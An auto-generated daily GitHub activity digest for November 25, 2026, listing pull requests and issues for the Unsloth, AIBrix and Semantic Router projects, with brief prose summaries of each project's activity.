- [#19349](https://github.com/unslothai/unsloth/pull/19349) Long-chat A/B: measure against the base tip the PR merge was built on
- [#19348](https://github.com/unslothai/unsloth/pull/19348) Tests: read unsloth sources as UTF-8 in the deprecated alias scan
- [#19282](https://github.com/unslothai/unsloth/pull/19282) Studio Qwen-Image-2.1: on float16 cards take the int8 text encoder only when the dense one does not fit host RAM
- [#19270](https://github.com/unslothai/unsloth/pull/19270) Studio Wan2.2 TI2V-5B: Auto keeps a resident bf16 DiT (INT8 weights fail the video accuracy bar)
- [#19343](https://github.com/unslothai/unsloth/pull/19343) Tests: stub servedSelection in the chat eject harness and fail on a body that throws
- [#19169](https://github.com/unslothai/unsloth/pull/19169) Studio: load a second quant of a loaded GGUF repo beside it
- [#19281](https://github.com/unslothai/unsloth/pull/19281) Pipeline parallel quantize-on-load: size the allocator warmup to the rank's stages and load synchronously
- [#19312](https://github.com/unslothai/unsloth/pull/19312) Studio: do not point CPU-only Krea 2 loads at GGUF files the catalog does not list
- [#19158](https://github.com/unslothai/unsloth/pull/19158) Studio: bring back MCP documents after a slow first listing
- [#19327](https://github.com/unslothai/unsloth/pull/19327) Tests: follow install.ps1 widened AMD probe and hipinfo gates
- [#19321](https://github.com/unslothai/unsloth/pull/19321) Studio: size Files menu names with the UI font token; run the Inductor cache guard unfiltered
- [#19181](https://github.com/unslothai/unsloth/pull/19181) Installer Windows: honour UNSLOTH_FORCE_ROCM_TORCH on a mixed NVIDIA + AMD host and say when the AMD card is skipped
- [#19265](https://github.com/unslothai/unsloth/pull/19265) Quieter model loading: rope probe, broken xformers notice, multi-GPU placement report
- [#19320](https://github.com/unslothai/unsloth/pull/19320) Tests: follow the sandbox save and snippet name helpers the Files menu split out
- [#19300](https://github.com/unslothai/unsloth/pull/19300) Core zoo: key the Inductor cache on the CPU target that built it
- [#19310](https://github.com/unslothai/unsloth/pull/19310) Tests: let the ST cache_dir guard follow the cache_folder mapping
- [#19251](https://github.com/unslothai/unsloth/pull/19251) Studio diffusion: read nvidia-smi once per placement probe and refine the split preview once
- [#19145](https://github.com/unslothai/unsloth/pull/19145) Keep models the Docker image downloads owned by the host user
- [#19271](https://github.com/unslothai/unsloth/pull/19271) Ulysses: build the whole-sequence mask without a [T, T] int64 temporary
- [#19268](https://github.com/unslothai/unsloth/pull/19268) DPO bf16 full finetuning: keep the bfloat16 autocast on TRL's fused LM head and on the reference model
- [#19220](https://github.com/unslothai/unsloth/pull/19220) Studio video: let the Wan 2-card VAE split engage, and finish both cards before its cleanup (illegal memory access on render 2)
- [#19296](https://github.com/unslothai/unsloth/pull/19296) Tests: give the readiness poll WSL launch stub a real environment dict
- [#19244](https://github.com/unslothai/unsloth/pull/19244) Cap a streamed eval split once per evaluate() call
- [#19170](https://github.com/unslothai/unsloth/pull/19170) Refuse a network-share adapter base that transformers resolves by itself
- [#19248](https://github.com/unslothai/unsloth/pull/19248) Studio: keep the composer's right controls across keystrokes
- [#19287](https://github.com/unslothai/unsloth/pull/19287) Studio i18n: translate the llama.cpp backend picker unavailable reasons
- [#19252](https://github.com/unslothai/unsloth/pull/19252) Studio chat sync: compare a generated reply's stored JSON by string first
- [#19283](https://github.com/unslothai/unsloth/pull/19283) Tests: pin the host RAM the llama.cpp placement tests launch on
- [#19113](https://github.com/unslothai/unsloth/pull/19113) GGUF LoRA export: read quantization_method case insensitively
- [#19242](https://github.com/unslothai/unsloth/pull/19242) Studio: skip the vLLM / SGLang port ownership scan until the engine is listening
- [#19221](https://github.com/unslothai/unsloth/pull/19221) feat(mlx): start a vllm-metal engine for fast_inference on Apple Silicon
- [#19253](https://github.com/unslothai/unsloth/pull/19253) Studio chat history: decode a large whole-thread save body off the event loop
- [#19279](https://github.com/unslothai/unsloth/pull/19279) Bump install.sh / install.ps1 pins to unsloth>=2026.11.11
- [#19278](https://github.com/unslothai/unsloth/pull/19278) Studio logs: add the managed vLLM log family to the reviewed list
- [#19222](https://github.com/unslothai/unsloth/pull/19222) Studio CI: skip edits confined to studio/backend/tests in the smokes that drive the running app
- [#19207](https://github.com/unslothai/unsloth/pull/19207) Backend CI: install test dependencies with uv pip install --system
- [#19204](https://github.com/unslothai/unsloth/pull/19204) CI: run the python floor check on one Core leg; drop the macOS version-window drift leg
- [#19203](https://github.com/unslothai/unsloth/pull/19203) CI: run the Windows installer checks only when what they read changes
- [#19264](https://github.com/unslothai/unsloth/pull/19264) Tests: stop re-splitting large source files and re-building scan maps per case
- [#19201](https://github.com/unslothai/unsloth/pull/19201) Tauri CI: run the Windows and macOS Rust jobs only when what they compile or read changes
- [#19185](https://github.com/unslothai/unsloth/pull/19185) Local Agent Guides CI: two connection shards instead of nine jobs
- [#19184](https://github.com/unslothai/unsloth/pull/19184) Windows smokes: run the API and update phases on one install
- [#19276](https://github.com/unslothai/unsloth/pull/19276) Studio logs: prove the managed engine log family prunes
- [#19167](https://github.com/unslothai/unsloth/pull/19167) Add per-attempt logs for managed vLLM
- [#19274](https://github.com/unslothai/unsloth/pull/19274) Tests: anchor the setup.sh AMD block on the guard prefix
- [#19272](https://github.com/unslothai/unsloth/pull/19272) Studio frontend tests: pin the chat refusal action, not the whole chain
- [#19087](https://github.com/unslothai/unsloth/pull/19087) [BUGFIX] mistral chat template: match official turn spacing and system fold
- [#19149](https://github.com/unslothai/unsloth/pull/19149) Studio settings: scroll the Agent permissions site list inside its own box
- [#19088](https://github.com/unslothai/unsloth/pull/19088) [BUGFIX] phi-3 chat template: emit eos_token after the last turn
- [#19153](https://github.com/unslothai/unsloth/pull/19153) Studio: reopen the last agent session with unsloth start --continue
- [#19166](https://github.com/unslothai/unsloth/pull/19166) Add per-attempt logs for managed SGLang
- [#19249](https://github.com/unslothai/unsloth/pull/19249) Studio: price the fixed Inkling 2 reserve and split multi-GPU pins by bytes (builds on #19148)
- [#19231](https://github.com/unslothai/unsloth/pull/19231) Studio: price llama-server host RAM growth before pinning a spilled load
- [#19179](https://github.com/unslothai/unsloth/pull/19179) Unsloth Studio: Compute backend picker greys out a backend it can't run here and says why, instead of hiding it
- [#19216](https://github.com/unslothai/unsloth/pull/19216) Move the Unsloth Studio MLX pins to mlx-vlm 0.8.1
- [#19142](https://github.com/unslothai/unsloth/pull/19142) Studio: keep Auto context small on CPU-only machines low on free RAM
- [#19236](https://github.com/unslothai/unsloth/pull/19236) Studio Images: opt-in Fast CFG for FLUX.3 Klein base (skip the unconditional pass in the last 20% of steps)
- [#19243](https://github.com/unslothai/unsloth/pull/19243) Desktop clean-machine CI: install the universal Windows installer
- [#19180](https://github.com/unslothai/unsloth/pull/19180) Installer: setup.sh builds ROCm llama.cpp from source when torch is ROCm on a mixed NVIDIA + AMD host
- [#19234](https://github.com/unslothai/unsloth/pull/19234) Inkling 2: Ulysses context parallel over native FSDP2 on the same ranks, so Inkling-2-Mini QLoRA fits 2x T4
- [#19241](https://github.com/unslothai/unsloth/pull/19241) Add test pinning gpt-oss developer block to openai-harmony
- [#19147](https://github.com/unslothai/unsloth/pull/19147) [Bug] AMD: install.sh puts CPU torch on a ROCm-less RX 9060 XT because it never reads the gfx arch KFD reports
- [#19092](https://github.com/unslothai/unsloth/pull/19092) Studio: pick the role column by role values, not just value-count ties
- [#19245](https://github.com/unslothai/unsloth/pull/19245) Keep scan_packages.py clear of Bitdefender's Python stealer signature again
- [#19232](https://github.com/unslothai/unsloth/pull/19232) Studio: read the ROCm TunableOp GEMM tables during diffusion LoRA training
- [#19156](https://github.com/unslothai/unsloth/pull/19156) Use the loaded adapter's toggle for unsloth chat --compare when Studio is running
- [#19250](https://github.com/unslothai/unsloth/pull/19250) Security audit: re-pin six reviewed unsloth-zoo 2026.11.10 sites in the package scan baseline
- [#18479](https://github.com/unslothai/unsloth/pull/18479) Bump the cargo-tauri group in /studio/src-tauri with 5 updates
- [#19157](https://github.com/unslothai/unsloth/pull/19157) Studio: keep Ollama Thinking controls per connection
- [#19247](https://github.com/unslothai/unsloth/pull/19247) Tests: stub replica_need_mib with its real signature
- [#19186](https://github.com/unslothai/unsloth/pull/19186) Studio Desktop: turn GPU compositing on for NVIDIA X11 drivers 590 and newer
- [#19229](https://github.com/unslothai/unsloth/pull/19229) fix(studio): find bundled DSpark heads under dspark and report their kind on MLX
- [#19228](https://github.com/unslothai/unsloth/pull/19228) Skinny decode linear: add the split-K LoRA term once, after the reduction
- [#19238](https://github.com/unslothai/unsloth/pull/19238) Desktop: bump url to 2.5.9 and cookie to 0.18.3 (RUSTSEC-2026-0592, RUSTSEC-2026-0594)
- [#19235](https://github.com/unslothai/unsloth/pull/19235) Studio INT8 attention: leave FLUX.1 and FLUX.2 out of Auto (route on request only)
- [#19164](https://github.com/unslothai/unsloth/pull/19164) Studio: keep deleted chat turns from coming back from another tab
- [#19237](https://github.com/unslothai/unsloth/pull/19237) Tests: pin the preset GPU selection the way #19154 keeps it
- [#19215](https://github.com/unslothai/unsloth/pull/19215) Tensor parallel: shard 4-bit routed experts by index and the 4-bit quantize-on-load, so Inkling-2-Mini QLoRA fits 2x T4
- [#19159](https://github.com/unslothai/unsloth/pull/19159) Studio: reuse the native prompt count in a GGUF chat's context fit
- [#19141](https://github.com/unslothai/unsloth/pull/19141) Score unsloth eval datasets in the chat format the model was trained on
- [#19230](https://github.com/unslothai/unsloth/pull/19230) Studio Krea 2: detect ROCm by its version tag in the prefix flash pick
- [#19213](https://github.com/unslothai/unsloth/pull/19213) Studio: never let a recorded CUDA graph read H3 video text rows or AdaLN buffers after they are freed
- [#19209](https://github.com/unslothai/unsloth/pull/19209) Studio multi-GPU: count the CFG replica's activations before admitting it on the partner card
- [#19143](https://github.com/unslothai/unsloth/pull/19143) Studio: stop earlier thoughts from shrinking the thinking budget
- [#19227](https://github.com/unslothai/unsloth/pull/19227) Studio frontend: fix the two unit test reds from #19197 and #19198
- [#19211](https://github.com/unslothai/unsloth/pull/19211) Studio MOSS-Image: keep RoPE tables recorded by a CUDA graph out of the FIFO cache (noise from the fourth render)
- [#19155](https://github.com/unslothai/unsloth/pull/19155) Studio: keep saved timings in transcript JSON exports
- [#19226](https://github.com/unslothai/unsloth/pull/19226) Tests: a bare base64 image reaches llama-server as the checked data URL
- [#19196](https://github.com/unslothai/unsloth/pull/19196) Studio tool sandbox: root-run secrets, keyring, probe timeouts, macOS workdir, MCP evaluate
- [#19224](https://github.com/unslothai/unsloth/pull/19224) Tests: follow the remote-code gate model source helper from #19189
- [#19154](https://github.com/unslothai/unsloth/pull/19154) Studio: keep the custom chat template when applying a chat preset
- [#19162](https://github.com/unslothai/unsloth/pull/19162) [Bug] Unsloth Studio / Desktop: Glass strength jumps from no blur at 0% to full blur at 1%, then stays flat to ~60%
- [#19192](https://github.com/unslothai/unsloth/pull/19192) Studio managed accounts: close side doors around the model access check
- [#19195](https://github.com/unslothai/unsloth/pull/19195) Studio tool sandbox: shared cache readers and deletes stay inside the cache
- [#19208](https://github.com/unslothai/unsloth/pull/19208) Studio Krea 2: attend over the valid key prefix without a mask so INT8 attention can take it
- [#19200](https://github.com/unslothai/unsloth/pull/19200) Studio: refuse Windows network-share paths in the frontend route and probes, no Ghostscript
- [#19187](https://github.com/unslothai/unsloth/pull/19187) Studio LTX-2.5: refuse cleanly on fp16-only cards when the host cannot hold the float32 load
- [#19174](https://github.com/unslothai/unsloth/pull/19174) Studio Krea 2: take the low-RAM load route on fp16-only cards instead of being killed
- [#19194](https://github.com/unslothai/unsloth/pull/19194) Studio Data Recipe and saved datasets: keep managed accounts in their own data
- [#19191](https://github.com/unslothai/unsloth/pull/19191) Studio export worker: dataset card guard, drafter converter, late adapters, reused folders

#### 🐛 New Issues
- [#19275](https://github.com/unslothai/unsloth/issues/19275) [Bug] VRAM OOM inkling 2 mini `feature request` `bug` 💬2
- [#19298](https://github.com/unslothai/unsloth/issues/19298) [Feature] Support Ling-3.2-air (multi-modal) `feature request`
- [#19383](https://github.com/unslothai/unsloth/issues/19383) [Feature] Add MCP Endpoint for Unsloth Docker Container `feature request` 💬1
- [#19341](https://github.com/unslothai/unsloth/issues/19341) [Bug] cuda13-portable llama.cpp prebuilt ships without the CUDA runtime and silently runs on the CPU 💬1
- [#19239](https://github.com/unslothai/unsloth/issues/19239) [Bug] Output generation failed with Inkling-2-mini on Arc 140V XPU (Vulkan) `feature request` `bug` 💬1
- [#19387](https://github.com/unslothai/unsloth/issues/19387) [Feature/Bug] Transcribe/ASR model not showing in API/logs + Request for transparent GPU/RAM allocation & CPU offload spillover controls
- [#19376](https://github.com/unslothai/unsloth/issues/19376) [Bug] Inkling-2-Mini: "Failed to process regex" (std::regex error_stack) `feature request` `bug`
- [#19352](https://github.com/unslothai/unsloth/issues/19352) [Bug] Local tool loop can dispatch a call with no room to retain its result
- [#19346](https://github.com/unslothai/unsloth/issues/19346) [Bug] chat banner empty `feature request` `bug`
- [#19317](https://github.com/unslothai/unsloth/issues/19317) [Bug] CUDA resource already mapped error on second video generation with unsloth/MiniMax-H3 in Desktop App `feature request` `bug`
- [#19340](https://github.com/unslothai/unsloth/issues/19340) [Bug] AMD: one gfx10 iGPU in the visible set turns bf16 off for the whole process, even when training runs on an RDNA4 card
- [#19309](https://github.com/unslothai/unsloth/issues/19309) [Bug] Incorrect loading into unified memory on Ryzen 8700G & Radeon 780M #2 `feature request` `bug`
- [#19240](https://github.com/unslothai/unsloth/issues/19240) [Feature] Make VRAM Budget configurable per GPU when there is more than 1 `feature request`

#### 🔒 Closed Issues
- [#18805](https://github.com/unslothai/unsloth/issues/18805) [Bug] Windows Strix Halo: host-shortfall check still forces mmap after carve-out fix (#17605 follow-up)
- [#18726](https://github.com/unslothai/unsloth/issues/18726) [Bug] Gemini 4 model call - "Penalty is not enabled for this model (INVALID_ARGUMENT)"
- [#19124](https://github.com/unslothai/unsloth/issues/19124) [Feature] Cap the height of the per-site Agent permissions list
- [#19383](https://github.com/unslothai/unsloth/issues/19383) [Feature] Add MCP Endpoint for Unsloth Docker Container
- [#19340](https://github.com/unslothai/unsloth/issues/19340) [Bug] AMD: one gfx10 iGPU in the visible set turns bf16 off for the whole process, even when training runs on an RDNA4 card

### AIBrix (`vllm-project/aibrix`)

**Stars:** 5,204 · **Open issues:** 438 · **Last push:** <1h ago

On November 25, 2026, there were no new releases for AIBrix. Significant progress was made with the merging of several important pull requests, including #3581, which extracted the gateway async job registry into a dedicated package, and #3591, which added a move commit to .git-blame-ignore-revs. Bug fixes included #3592, which capped the non-streamed gateway response buffer, and #3586, addressing an issue where a client-supplied traceparent collided with the gateway request ID. Notably, a new RFC was opened in #3588, proposing the removal of global selectMu Redis I/O to alleviate bottlenecks in PD routing.

#### ✅ Merged PRs
- [#3581](https://github.com/vllm-project/aibrix/pull/3581) [Misc] Extract the gateway async job registry into its own package
- [#3443](https://github.com/vllm-project/aibrix/pull/3443) [Bug] Scale Conductor decode TBT per request instead of per batch (#3333)
- [#3582](https://github.com/vllm-project/aibrix/pull/3582) [Misc] Split pkg/plugins/gateway util.go by topic (PR 1 of #3557)
- [#3592](https://github.com/vllm-project/aibrix/pull/3592) [Bug] Cap the non-streamed gateway response buffer (#3584)
- [#3486](https://github.com/vllm-project/aibrix/pull/3486) [Bug] Share the Gateway and HTTPRoute namespace with ModelRouter
- [#3591](https://github.com/vllm-project/aibrix/pull/3591) [Misc] Add PR 4a move commit to .git-blame-ignore-revs (#3557)
- [#3590](https://github.com/vllm-project/aibrix/pull/3590) [Feat] Move PD decode Redis reads outside selectMu and reuse RunningRequests snapshot (#3588)
- [#3575](https://github.com/vllm-project/aibrix/pull/3575) [Feat] Enable routing candidate stage by default (AIBRIX_ROUTING_CANDIDATE_K=64) (#3188)
- [#3573](https://github.com/vllm-project/aibrix/pull/3573) [Misc] Move gateway leaf helpers into auth, modelclaim and inflight packages (PR 4a of #3557)
- [#3569](https://github.com/vllm-project/aibrix/pull/3569) [Feat] List only object metadata for the model-list consistency check
- [#3562](https://github.com/vllm-project/aibrix/pull/3562) [Refactor] Make pkg/plugins/gateway test helpers test-only (PR 0 of #3557)
- [#3561](https://github.com/vllm-project/aibrix/pull/3561) [Bug] Place /healthz route before /health in standalone Envoy config
- [#3568](https://github.com/vllm-project/aibrix/pull/3568) [Docs] Create aibrix-system before installing individual components

#### 🐛 New Issues
- [#3588](https://github.com/vllm-project/aibrix/issues/3588) [RFC]: Remove global selectMu Redis I/O, redundant snapshots, and HTTP pool bottlenecks in PD routing `area/gateway` `triage/accepted` `kind/feature` 💬7
- [#3587](https://github.com/vllm-project/aibrix/issues/3587) [Bug] Removing a role from a StormService (Pooled / InPlaceUpdate) leaks the old role's pods `kind/bug` `triage/accepted` `area/orchestration` 💬7
- [#3586](https://github.com/vllm-project/aibrix/issues/3586) [Bug] Client-supplied traceparent is used as the gateway request ID, colliding PD load-accounting state `kind/bug` `area/gateway` `triage/accepted` 💬7
- [#3585](https://github.com/vllm-project/aibrix/issues/3585) [Bug] PodAutoscaler reconcile can be starved by unreachable pods, so scaling is skipped `kind/bug` `triage/accepted` `area/orchestration` 💬7
- [#3584](https://github.com/vllm-project/aibrix/issues/3584) [Bug] Gateway buffers the entire non-streamed response body with no size limit `kind/bug` `area/gateway` `triage/accepted` `area/batch` 💬7
- [#3598](https://github.com/vllm-project/aibrix/issues/3598) [Feature] gateway: pick the dormant ModelClaim binding by readiness and pod load instead of first-sorted pod `area/gateway` `triage/needs-information` `triage/accepted` `kind/feature` 💬4
- [#3589](https://github.com/vllm-project/aibrix/issues/3589) [Feature] Export watch progress age, a free signal for a gateway replica whose watch is stuck `area/gateway` `triage/accepted` `kind/feature` 💬4
- [#3583](https://github.com/vllm-project/aibrix/issues/3583) [Bug] A batch job stays in finalizing after the metadata service restarts mid-finalization `kind/bug` `triage/accepted` `area/batch` 💬3
- [#3597](https://github.com/vllm-project/aibrix/issues/3597) [Bug] Requests that arrive together all read 0 running requests, tie, and go to the name-first pod `kind/bug` `area/gateway` `triage/accepted` 💬2
- [#3576](https://github.com/vllm-project/aibrix/issues/3576) [Bug] SGLang PD prefill HTTP requests outlive client cancellation `kind/bug` `area/gateway` `triage/accepted` `bug` 💬2

#### 🔒 Closed Issues
- [#3333](https://github.com/vllm-project/aibrix/issues/3333) [Bug] Conductor decode policy routes to the busiest decode pod

### Semantic Router (`vllm-project/semantic-router`)

**Stars:** 6,525 · **Open issues:** 708 · **Last push:** 2h ago

There were no new releases for Semantic Router on November 25, 2026. A significant bug fix was merged, addressing an issue with ending an exact-cache lease when its request concludes. New issues reported included a bug (#7373) concerning the "router is live" page not displaying the correct listener port, as well as a failure in dataset preparation (#7376) due to a misconfigured worker environment. Other notable bugs include a problematic router target error (#7382) linked to withheld receipts, and an unclear setup process where the wizard falsely indicates the router's operational status (#7371).

#### ✅ Merged PRs
- [#6567](https://github.com/vllm-project/semantic-router/pull/6567) [Bug] End an exact-cache lease when its request ends

#### 🐛 New Issues
- [#7373](https://github.com/vllm-project/semantic-router/issues/7373) [Bug] The "router is live" page gives a base URL without the listener port `bug` `accepted` `in-progress` `wg/developer-experience-ecosystem` 💬4
- [#7376](https://github.com/vllm-project/semantic-router/issues/7376) [Bug] sr-bench dataset preparation fails: the worker has `HOME=/`, so Hugging Face's cache at `/.cache` is not writable `bug` `accepted` `in-progress` `wg/evaluation-quality` 💬4
- [#7382](https://github.com/vllm-project/semantic-router/issues/7382) [Bug] A router (MoM) sr-bench target fails with an unclear identity error when the Router withholds its receipts `bug` `accepted` `in-progress` `wg/evaluation-quality` 💬3
- [#7370](https://github.com/vllm-project/semantic-router/issues/7370) [Bug] A CLI installed from source runs the moving `latest` images, and they reject its config `bug` `accepted` `in-progress` `wg/developer-experience-ecosystem` 💬3
- [#7383](https://github.com/vllm-project/semantic-router/issues/7383) [Bug] After Start evaluation, the drawer turns into a "Re-run evaluation" form `bug` `accepted` `in-progress` `wg/evaluation-quality` 💬2
- [#7381](https://github.com/vllm-project/semantic-router/issues/7381) [Bug] The size cards say "0 questions per target" while the plan has 14 `bug` `accepted` `in-progress` `wg/evaluation-quality` 💬2
- [#7380](https://github.com/vllm-project/semantic-router/issues/7380) [Bug] A target without prices blocks the plan with an internal error (`require_priced` … `capability_only`) `bug` `accepted` `in-progress` `wg/evaluation-quality` 💬2
- [#7379](https://github.com/vllm-project/semantic-router/issues/7379) [Bug] Nothing tells the operator how to get the `config_hash` a router (MoM) target needs `bug` `accepted` `in-progress` `wg/evaluation-quality` 💬2
- [#7378](https://github.com/vllm-project/semantic-router/issues/7378) [Bug] "No targets are registered … this list updates automatically" does not update `bug` `accepted` `in-progress` `wg/evaluation-quality` 💬2
- [#7377](https://github.com/vllm-project/semantic-router/issues/7377) [Bug] Preparation errors are reduced to a fixed message and the worker's log is thrown away `bug` `accepted` `in-progress` `wg/evaluation-quality` 💬2
- [#7375](https://github.com/vllm-project/semantic-router/issues/7375) [Bug] The browser saves a model's access key as the dashboard login and autofills it on sign-in `bug` `accepted` `in-progress` `wg/enterprise-environment` 💬2
- [#7374](https://github.com/vllm-project/semantic-router/issues/7374) [Bug] A setup page left open stays on "Step 1 of 3" after the first admin is created elsewhere `bug` `accepted` `in-progress` `wg/developer-experience-ecosystem` 💬2
- [#7372](https://github.com/vllm-project/semantic-router/issues/7372) [Bug] The default decision model needs 15 GiB yet is "Recommended for CPU" on a 7.7 GiB host `bug` `accepted` `in-progress` `wg/developer-experience-ecosystem` 💬2
- [#7371](https://github.com/vllm-project/semantic-router/issues/7371) [Bug] The setup wizard says "Your router is live" when the Router never started `bug` `accepted` `in-progress` `wg/developer-experience-ecosystem` 💬2
- [#7362](https://github.com/vllm-project/semantic-router/issues/7362) [Bug] Kubernetes CLI can time out waiting on a terminating pod after rollout `accepted` `in-progress` `wg/enterprise-environment` 💬2

#### 🔒 Closed Issues
- [#5947](https://github.com/vllm-project/semantic-router/issues/5947) [Bug] A/B benchmarks silently discard failed request pairs
- [#7153](https://github.com/vllm-project/semantic-router/issues/7153) [Feature] Reduce request latency with file-backed Router Replay enabled
- [#6568](https://github.com/vllm-project/semantic-router/issues/6568) [Bug] Synthetic process failure case in model runtime evidence is not declared in expected_cases inventory
- [#6546](https://github.com/vllm-project/semantic-router/issues/6546) [Bug] A response the cache does not store keeps its singleflight lease for the whole lease
- [#6965](https://github.com/vllm-project/semantic-router/issues/6965) [Feature] Serve an API under a configurable path prefix (e.g. /anthropic for Messages)
- [#6652](https://github.com/vllm-project/semantic-router/issues/6652) [Feature] Ship a reproducible sr-bench run skill
- [#6653](https://github.com/vllm-project/semantic-router/issues/6653) [Feature] Compare Router configurations with paired benchmark evidence
- [#6654](https://github.com/vllm-project/semantic-router/issues/6654) [Feature] Connect skill-based recipe tuning to calibration and recipe-lab

---
*This digest is auto-generated by [agents-radar](https://github.com/yaojiejia/agents-radar).*